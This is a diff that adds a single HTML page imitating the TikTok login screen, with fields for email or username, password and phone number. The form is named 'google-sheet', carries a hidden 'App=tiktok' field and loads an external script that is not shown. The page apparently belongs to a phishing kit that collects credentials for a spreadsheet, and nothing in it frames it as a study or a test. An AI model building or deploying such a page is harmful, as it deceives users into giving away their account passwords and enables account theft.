@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok</title>
+    <link rel="icon" href="https://www.tiktok.com/favicon.ico" type="image/x-icon">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #fff;
+            color: #000;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        .login-container {
+            background-color: #fff;
+            width: 100%;
+            max-width: 400px;
+            padding: 24px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            padding: 10px 0;
+        }
+
+        .header .icon {
+            font-size: 24px;
+            color: #000;
+            cursor: pointer;
+        }
+
+        .circle-icon {
+            border: 1px solid #000;
+            border-radius: 50%;
+            padding: 4px;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .header .title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+        }
+
+        .tabs {
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+            position: relative;
+        }
+
+        .tab {
+            font-size: 16px;
+            font-weight: 600;
+            padding: 10px 0;
+            cursor: pointer;
+            color: #555;
+            flex: 1;
+            text-align: center;
+        }
+        
+        .tab-active {
+            color: #000;
+            border-bottom: 2px solid #000;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            width: 100%;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            background-color: #f0f0f0;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            color: #000;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #000;
+        }
+
+        .input-field::placeholder {
+            color: #888;
+        }
+        
+        .forgot-password-link {
+            font-size: 14px;
+            color: #000;
+            text-decoration: none;
+            text-align: right;
+            font-weight: 500;
+            width: 100%;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #fe2c55;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #fff;
+            cursor: pointer;
+        }
+
+        .login-button:hover {
+            background-color: #d62447;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <form name="google-sheet" class="login-container">
+        <div class="header">
+            <span class="icon">&#8592;</span>
+            <div class="title">Login to TikTok</div>
+            <span class="icon circle-icon">?</span>
+        </div>
+
+        <div class="tabs">
+            <div id="phone-tab" class="tab">Phone</div>
+            <div id="email-tab" class="tab tab-active">Email / Username</div>
+        </div>
+        
+        <div id="email-form" class="input-group">
+            <input name="App" type="hidden" value="tiktok">
+            <input name="UserName" type="text" class="input-field" placeholder="Email or username" required>
+            <input name="PassWord" type="password" class="input-field" placeholder="Password" required>
+        </div>
+
+        <div id="phone-form" class="input-group" style="display: none;">
+            <input name="Number" type="tel" class="input-field" placeholder="Phone number">
+        </div>
+        
+        <a href="#" class="forgot-password-link">Forgot password?</a>
+        
+        <button type="submit" class="login-button">Log in</button>
+    </form>
+
+    <script>
+        const phoneTab = document.getElementById('phone-tab');
+        const emailTab = document.getElementById('email-tab');
+        const phoneForm = document.getElementById('phone-form');
+        const emailForm = document.getElementById('email-form');
+
+        phoneTab.addEventListener('click', () => {
+            emailTab.classList.remove('tab-active');
+            phoneTab.classList.add('tab-active');
+            emailForm.style.display = 'none';
+            phoneForm.style.display = 'flex';
+        });
+
+        emailTab.addEventListener('click', () => {
+            phoneTab.classList.remove('tab-active');
+            emailTab.classList.add('tab-active');
+            phoneForm.style.display = 'none';
+            emailForm.style.display = 'flex';
+        });
+    </script>
+    
+        <script src="../script.js"></script>
+</body>
+</html>
